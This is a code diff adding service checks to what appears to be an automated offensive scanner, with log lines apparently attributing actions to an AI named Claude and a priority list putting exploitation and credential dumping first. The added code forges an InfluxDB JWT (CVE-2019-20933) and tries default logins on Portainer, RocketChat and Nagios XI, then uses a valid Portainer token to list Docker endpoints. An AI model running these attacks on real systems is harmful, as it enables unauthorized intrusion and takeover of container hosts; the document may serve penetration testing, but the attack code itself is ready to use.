@@ -11141,6 +11141,100 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                     "description": f"Vault accesible — puede contener secrets, credentials, certificates.\n{vault_out[:300]}",
                 }], target)
 
+        # ── InfluxDB no-auth (8086) ───────────────────────────────────────────
+        if 8086 in port_set:
+            self._log(f"[Claude] EXTRA: InfluxDB no-auth check → {target}:8086")
+            influx_out, _ = self._run_cmd(
+                "influxdb-noauth",
+                f"# InfluxDB JWT bypass CVE-2019-20933\n"
+                f"curl -s --max-time 10 'http://{target}:8086/query?q=SHOW+DATABASES' 2>/dev/null | head -5; "
+                f"curl -s --max-time 10 'http://{target}:8086/ping' 2>/dev/null | head -3; "
+                f"# Try with empty JWT\n"
+                f"curl -s --max-time 10 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.SIGNATURE' "
+                f"'http://{target}:8086/query?q=SHOW+DATABASES' 2>/dev/null | head -5",
+                target, timeout=20,
+            )
+            if re.search(r'databases|results|influxdb', influx_out, re.IGNORECASE):
+                accumulated_output.append(f"=== InfluxDB {target}:8086 ===\n{influx_out[:400]}")
+                self._save_findings([{
+                    "title": f"InfluxDB — Acceso Sin Autenticación @ {target}:8086",
+                    "severity": "critical",
+                    "description": f"InfluxDB accesible sin auth. Posible CVE-2019-20933 JWT bypass.\n{influx_out[:200]}",
+                    "cve": "CVE-2019-20933",
+                }], target)
+
+        # ── Portainer (9000/9443) ─────────────────────────────────────────────
+        if 9000 in port_set or 9443 in port_set:
+            portainer_port = 9000 if 9000 in port_set else 9443
+            portainer_proto = "https" if portainer_port == 9443 else "http"
+            self._log(f"[Claude] EXTRA: Portainer default creds → {target}:{portainer_port}")
+            portainer_out, _ = self._run_cmd(
+                f"portainer-creds-{portainer_port}",
+                f"# Check Portainer API\n"
+                f"curl -s --max-time 8 '{portainer_proto}://{target}:{portainer_port}/api/status' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"Version\",\"\"),d.get(\"Edition\",\"\"))' 2>/dev/null; "
+                f"# Try default admin creds\n"
+                f"TOKEN=$(curl -s --max-time 10 -X POST "
+                f"'{portainer_proto}://{target}:{portainer_port}/api/auth' "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"username\":\"admin\",\"password\":\"tryharder\"}}' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"jwt\",\"\"))' 2>/dev/null); "
+                f"[ -n \"$TOKEN\" ] && {{ echo 'PORTAINER_CREDS_VALID'; "
+                f"curl -s -H \"Authorization: Bearer $TOKEN\" "
+                f"'{portainer_proto}://{target}:{portainer_port}/api/endpoints' 2>/dev/null | head -10; }}",
+                target, timeout=20,
+            )
+            if "PORTAINER_CREDS_VALID" in portainer_out or "Version" in portainer_out:
+                accumulated_output.append(f"=== Portainer {portainer_port} ===\n{portainer_out[:400]}")
+                if "PORTAINER_CREDS_VALID" in portainer_out:
+                    self._save_findings([{
+                        "title": f"Portainer — Credenciales por Defecto @ {target}:{portainer_port}",
+                        "severity": "critical",
+                        "description": f"Portainer acepta admin:tryharder → acceso total a Docker daemon via interfaz web.\n{portainer_out[:200]}",
+                        "cve": "",
+                    }], target)
+
+        # ── RocketChat / Mattermost (3000) ────────────────────────────────────
+        if 3000 in port_set:
+            rc_out, _ = self._run_cmd(
+                "rocketchat-mattermost-3000",
+                f"# Check RocketChat API\n"
+                f"curl -s --max-time 8 'http://{target}:3000/api/v1/info' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"info\",{{}}).get(\"version\",\"\"))' 2>/dev/null; "
+                f"# Default creds RocketChat\n"
+                f"curl -s --max-time 10 -X POST 'http://{target}:3000/api/v1/login' "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"user\":\"admin\",\"password\":\"admin\"}}' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"status\",\"\"),d.get(\"data\",{{}}).get(\"userId\",\"\"))' 2>/dev/null; "
+                f"# Check Mattermost\n"
+                f"curl -s --max-time 8 'http://{target}:3000/api/v4/system/ping' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"Mattermost\",d.get(\"version\",\"\"))' 2>/dev/null",
+                target, timeout=20,
+            )
+            if rc_out.strip():
+                accumulated_output.append(f"=== RocketChat/Mattermost 3000 ===\n{rc_out[:300]}")
+
+        # ── Nagios XI (80/443) ────────────────────────────────────────────────
+        if any(p in port_set for p in (80, 443, 8080)):
+            nagios_out, _ = self._run_cmd(
+                "nagios-check",
+                f"curl -s --max-time 8 'http://{target}/nagiosxi/login.php' 2>/dev/null | "
+                f"grep -qi 'nagios' && echo 'NAGIOS_DETECTED'; "
+                f"curl -s --max-time 10 -X POST 'http://{target}/nagiosxi/login.php' "
+                f"-d 'username=nagiosadmin&password=nagiosadmin&loginButton=Login' "
+                f"2>/dev/null | grep -qi 'logout\\|dashboard\\|Core Config Manager' && echo 'NAGIOS_DEFAULT_CREDS'",
+                target, timeout=20,
+            )
+            if "NAGIOS" in nagios_out:
+                accumulated_output.append(f"=== Nagios ===\n{nagios_out[:300]}")
+                if "DEFAULT_CREDS" in nagios_out:
+                    self._save_findings([{
+                        "title": f"Nagios XI — Credenciales por Defecto (nagiosadmin:nagiosadmin) @ {target}",
+                        "severity": "critical",
+                        "description": "Nagios XI acepta credenciales por defecto. CVE-2023-40931 SQL injection + RCE.",
+                        "cve": "CVE-2023-40931",
+                    }], target)
+
     # ─────────────────────────────────────────────────────────────────────────
     # Feature 1: Kernel privesc auto (DirtyPipe, PwnKit, DirtyCow, Baron Samedit)
     # ─────────────────────────────────────────────────────────────────────────
